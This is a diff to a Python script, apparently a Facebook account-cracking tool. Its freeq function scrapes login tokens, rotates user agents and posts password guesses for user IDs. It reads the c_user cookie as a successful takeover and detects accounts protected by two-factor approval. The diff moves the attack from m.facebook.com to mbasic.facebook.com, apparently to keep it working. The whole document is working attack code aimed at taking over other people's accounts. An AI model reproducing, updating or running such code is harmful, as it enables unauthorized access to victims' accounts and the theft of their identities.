@@ -2196,7 +2196,7 @@ def freeq(uid,pwx,tl):
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com/').text
+            free_fb = Session.get('https://mbasic.facebook.com/').text
             data = {
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -2206,7 +2206,7 @@ def freeq(uid,pwx,tl):
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
             'login': 'Masuk'}
             headers = {
-            'Host': 'm.facebook.com',
+            'Host': 'mbasic.facebook.com',
             'method': 'POST',
             'path': '/login/Device-based/login/async/',
             'scheme': 'https',
@@ -2226,8 +2226,8 @@ def freeq(uid,pwx,tl):
             'user-agent': ua,
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'dnt': '1',
-            'origin': 'https://m.facebook.com',
-            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
+            'origin': 'https://mbasic.facebook.com',
+            'referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
             'x-requested-with': 'mark.via.gp',
             'sec-fetch-site': 'none',
             'sec-fetch-mode': 'navigate',
@@ -2236,7 +2236,7 @@ def freeq(uid,pwx,tl):
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/device-based/login/async/?api_key=531310443646320&auth_token=b8e3c549123592c35a5abcf94018abcb&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fclient_id%3D531310443646320%26redirect_uri%3Dhttps%253A%252F%252Ffederatedid-na1.services.adobe.com%252Ffederated%252FfromOIDC%26state%3DAYrrF_CKVfDuzpZthbP3NDHslWyCHBXiy3EhGfLPlp7vTIklgZJ-ani285stO9DonjH9GI1egpT-%26scope%3Demail%2Bpublic_profile%26response_type%3Dcode%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1ebf45f3-ba40-4074-ac42-2ca0e8a52a67%26tp%3Dunspecified&refsrc=deprecated&app_id=531310443646320&cancel=https%3A%2F%2Ffederatedid-na1.services.adobe.com%2Ffederated%2FfromOIDC%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAYrrF_CKVfDuzpZthbP3NDHslWyCHBXiy3EhGfLPlp7vTIklgZJ-ani285stO9DonjH9GI1egpT-%23_%3D_&lwv=100"
+            url = "https://mbasic.facebook.com/login/device-based/login/async/?api_key=531310443646320&auth_token=b8e3c549123592c35a5abcf94018abcb&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fclient_id%3D531310443646320%26redirect_uri%3Dhttps%253A%252F%252Ffederatedid-na1.services.adobe.com%252Ffederated%252FfromOIDC%26state%3DAYrrF_CKVfDuzpZthbP3NDHslWyCHBXiy3EhGfLPlp7vTIklgZJ-ani285stO9DonjH9GI1egpT-%26scope%3Demail%2Bpublic_profile%26response_type%3Dcode%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1ebf45f3-ba40-4074-ac42-2ca0e8a52a67%26tp%3Dunspecified&refsrc=deprecated&app_id=531310443646320&cancel=https%3A%2F%2Ffederatedid-na1.services.adobe.com%2Ffederated%2FfromOIDC%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAYrrF_CKVfDuzpZthbP3NDHslWyCHBXiy3EhGfLPlp7vTIklgZJ-ani285stO9DonjH9GI1egpT-%23_%3D_&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
